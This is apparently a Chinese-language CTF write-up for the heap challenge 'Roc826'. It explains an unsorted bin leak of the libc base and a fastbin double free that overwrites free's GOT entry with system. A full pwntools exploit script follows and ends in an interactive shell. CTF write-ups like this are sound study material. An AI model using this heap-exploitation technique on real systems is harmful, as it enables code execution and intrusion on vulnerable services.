## Roc826

- 不会堆的题，这题比赛时没做，后来照着官方wp赶紧学习一波
- 堆溢出，知识点：`double free`&`unsorted bin leak`

### 背景姿势

- glibc (<2.27)堆分配的策略：即 first-fit。在分配内存时,malloc 会先到 unsorted bin(或者fastbins) 中查找适合的被 free 的 chunk,如果没有,就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中,然后再去这些 bins 里去找合适的 chunk。可以看到第三次 malloc 的地址和第一次相同,即 malloc 找到了第一次 free 掉的chunk,并把它重新分配。
- fast chunk表示正在使用的长度在`32-160`(32位系统是`16-80`)的堆块，而fastbin表示长度在`32-180`范围内的已经释放的堆块

### 漏洞利用

- unsorted bin leak ：泄漏`main_arena`地址（即`__malloc_hook-0x68`）

- double free：fastbin attack覆写`free`的`got`表为`system`地址，或者改`free_hook`为`one_gadget`都可以`getshell`

  ```python
  #!/usr/bin/python
  #coding=utf-8
  #__author__:TaQini
  
  from pwn import *
  
  local_file  = './Roc826'
  local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
  remote_libc = '../libc-2.23.so'
  
  is_local = False
  is_remote = False
  
  if len(sys.argv) == 1:
      is_local = True
      p = process(local_file)
      libc = ELF(local_libc)
  elif len(sys.argv) > 1:
      is_remote = True
      if len(sys.argv) == 3:
          host = sys.argv[1]
          port = sys.argv[2]
      else:
          host, port = sys.argv[1].split(':')
      p = remote(host, port)
      libc = ELF(remote_libc)
  
  elf = ELF(local_file)
  
  context.log_level = 'debug'
  context.arch = elf.arch
  
  se      = lambda data               :p.send(data) 
  sa      = lambda delim,data         :p.sendafter(delim, data)
  sl      = lambda data               :p.sendline(data)
  sla     = lambda delim,data         :p.sendlineafter(delim, data)
  sea     = lambda delim,data         :p.sendafter(delim, data)
  rc      = lambda numb=4096          :p.recv(numb)
  ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
  uu32    = lambda data               :u32(data.ljust(4, '\0'))
  uu64    = lambda data               :u64(data.ljust(8, '\0'))
  info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
  
  def debug(cmd=''):
      if is_local: gdb.attach(p,cmd)
  
  def add(size,cont='aaaa'):
      sla(':','1')
      sla('size?\n',str(size))
      sla('content:',cont)
  
  def delete(index):
      sla(':','2')
      sla('index?\n',str(index))
  
  def show(index):
      sla(':','3')
      sla('index?\n',str(index))
      ru('content:')
      return ru('-----------------')
  
  # info
  # gadget
  # elf, libc
  add(0x80)
  add(0x58)
  add(0x58)
  add(0x58,'/bin/sh\x00')
  
  delete(0)
  data = show(0)[:-1].ljust(8,'\0')
  log.hexdump(data)
  libcbase = u64(data) - libc.sym['__malloc_hook'] - 0x68
  info_addr('libcbase',libcbase)
  
  delete(1)
  delete(2)
  delete(1)
  debug()
  add(0x58,p64(0x601ffa)) # got[free]-14-16
  add(0x58)
  add(0x58)
  add(0x58,'aaaaaaaaaaaaaa'+p64(libcbase+libc.sym['system'])[:6])
  
  delete(3)
  
  p.interactive()
  ```

  